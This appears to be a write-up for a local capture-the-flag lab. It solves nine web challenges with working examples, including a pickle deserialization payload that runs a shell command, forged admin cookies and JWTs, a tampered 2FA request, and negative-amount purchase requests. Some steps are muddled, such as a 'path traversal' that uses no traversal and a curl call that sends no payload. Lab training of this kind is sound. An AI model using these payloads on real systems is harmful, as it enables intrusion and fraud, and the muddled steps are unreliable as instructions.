# 🔥 CTF Challenge Solutions – Step-by-Step Guide

## 🚀 Overview
This document provides a **detailed walkthrough** of all challenges in the CTF event, including **exploits, solutions, and techniques** to capture the flags.

✅ **Step-by-step solutions**  
✅ **Command-line examples**  
✅ **Burp Suite & cURL techniques**  
✅ **Real-world exploitation concepts**  

---

## 📂 **Challenges & Solutions**

### 🛠 Path Traversal
**📌 Goal:** Read a flag file by navigating outside the intended directory.  

**🔹 Steps:**  
```sh
ls            # Check for 'flags/' directory
ls flags      # View files inside
cat flags/flag.txt  # Read the flag
```
✅ **Flag captured!**  

---

### 🖥 OS Command Injection
**📌 Goal:** Execute arbitrary commands on the server.  

**🔹 Steps:**  
```sh
ls /flags         # Locate flag files
cat /flags/flag.txt  # Read the flag
```
✅ **Flag captured!**  

---

### 📦 Insecure Deserialization
**📌 Goal:** Exploit unsafe deserialization to execute commands.  

**🔹 Steps:**  
1️⃣ Visit: `http://localhost:5000/canopic_jar`  
2️⃣ Create a **malicious pickle payload**:  
```python
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /flags/flag.txt",))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```
3️⃣ Send the payload via the web input or:  
```sh
curl -X GET http://localhost:5000/canopic_jar
```
✅ **Flag captured!**  

---

### 🛒 Client-Side Exploit
**📌 Goal:** Manipulate client-side validation to exploit the store.  

**🔹 Steps:**  
1️⃣ **DevTools method:**  
   - Inspect the input field and change the value to `-1000`.  
2️⃣ **cURL method:**  
```sh
curl -X POST -d "price=-1000" http://localhost:5000/store/buy
```
✅ **Flag captured!**  

---

### 🔓 Broken Access Control
**📌 Goal:** Escalate privileges by modifying cookies.  

**🔹 Steps:**  
1️⃣ **DevTools method:**  
   - Open **Developer Tools** → "Application" → "Cookies".  
   - Change `role=user` to `role=admin`.  
   - Reload `/admin` to access restricted content.  
2️⃣ **cURL method:**  
```sh
curl -X GET http://localhost:5000/admin --cookie "role=admin"
```
✅ **Flag captured!**  

---

### 💰 Infinite Money Exploit
**📌 Goal:** Exploit business logic to get unlimited money.  

**🔹 Steps:**  
1️⃣ **DevTools method:**  
   - Change the amount input field to `-1000`.  
2️⃣ **cURL method:**  
```sh
curl -X POST -d "amount=-1000" http://localhost:5000/bank/transfer
```
✅ **Flag captured!**  

---

### 🗝 2FA Bypass
**📌 Goal:** Bypass 2FA by modifying the verification step.  

**🔹 Steps:**  
1️⃣ Log in and intercept `/verify_2fa` request in Burp Suite.  
2️⃣ Modify the request before sending:  
```
2fa=000000&verified=true
```
3️⃣ Submit and gain access!  
✅ **Flag captured!**  

---

### 📝 JWT Manipulation
**📌 Goal:** Modify the JWT token to escalate privileges.  

**🔹 Steps:**  
1️⃣ Copy JWT token from cookies.  
2️⃣ Open **jwt.io** and modify the payload:  
```json
{
  "username": "user",
  "role": "admin"
}
```
3️⃣ Replace the signature with a known weak key:  
```
MAYCAQACAQA=
```
4️⃣ Set the modified JWT in the browser console:  
```js
document.cookie = "auth_token=NEW_JWT_HERE; path=/";
```
5️⃣ Navigate to `/admin`.  
✅ **Flag captured!**  

---

### 🧩 Crypto Challenge
**📌 Goal:** Decrypt a file to retrieve the flag.  

**🔹 Steps:**  
1️⃣ Look for clues on the webpage (HTML source code or JS).  
2️⃣ Find the first part of the flag via a Base64 string.  
3️⃣ Download `secrets.enc` and decrypt it:  
```sh
openssl enc -d -aes-256-cbc -in secrets.enc -out decrypted.txt -k "TutankhamunsCurse"
```
4️⃣ Read `decrypted.txt` for the final flag.  
✅ **Flag captured!**  

---

## 🎯 Summary of Exploits
| Challenge  | Exploit Type  | Exploited Vulnerability |
|------------|--------------|------------------------|
| Path Traversal | File Inclusion | Lack of input validation |
| OS Command Injection | Code Execution | Unfiltered input in system commands |
| Insecure Deserialization | Remote Code Execution | Pickle object injection |
| Client-Side Exploit | Logic Manipulation | Client-side trust without server validation |
| Broken Access Control | Privilege Escalation | Weak role enforcement via cookies |
| Infinite Money Exploit | Business Logic Flaw | Lack of validation on transaction amounts |
| 2FA Bypass | Authentication Flaw | Manipulation of verification request |
| JWT Manipulation | Authentication Flaw | Weak signature verification |
| Crypto Challenge | Cryptography | Weak encryption or leaked key |

---

## 🏆 Final Thoughts
🚀 These challenges demonstrate real-world security flaws that can be **exploited in vulnerable applications**.  
🔍 **Test, learn, and improve your hacking skills!**  

🛠 **Happy Hacking!** 🛠  
